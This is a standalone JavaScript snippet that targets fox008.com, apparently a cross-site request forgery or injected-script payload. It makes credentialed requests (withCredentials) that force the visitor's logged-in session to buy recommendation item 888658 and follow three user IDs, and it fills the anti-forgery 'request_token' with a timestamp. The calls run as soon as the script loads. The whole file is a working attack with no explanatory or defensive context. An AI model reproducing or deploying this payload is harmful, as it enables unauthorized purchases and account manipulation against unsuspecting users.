function get_time()

  {
    var start=new Date().getTime();
    while(true) if(new Date().getTime()-start>1) break;
    return String(new Date().getTime())
  }
function url_buy(recommendId)
{
 return "http://www.fox008.com/YP/recommend/buy?t="+get_time()+"&recommendId="+recommendId+"&request_token="+get_time();
}
function url_follow(userid)
{
	return "http://www.fox008.com/user/follow?t="+get_time()+"&userId="+userid+"&type=&request_token="+get_time();
}
function buy(recommendId)
{
	var xmlhttp;
	if (window.XMLHttpRequest)
  	{// code for IE7+, Firefox, Chrome, Opera, Safari
  		xmlhttp=new XMLHttpRequest();
  	}
	else
  	{// code for IE6, IE5
  		xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
  	}
	xmlhttp.withCredentials = true;
	xmlhttp.open("POST",url_buy(recommendId),true);
	xmlhttp.send(null);
}
function follow(userid)
{
	var xmlhttp;
	if (window.XMLHttpRequest)
  	{// code for IE7+, Firefox, Chrome, Opera, Safari
  		xmlhttp=new XMLHttpRequest();
  	}
	else
  	{// code for IE6, IE5
  		xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
  	}
	xmlhttp.withCredentials = true;
	xmlhttp.open("GET",url_follow(userid),true);
	xmlhttp.send(null);
}

buy("888658");
follow("137536");
follow("140665");
follow("176940");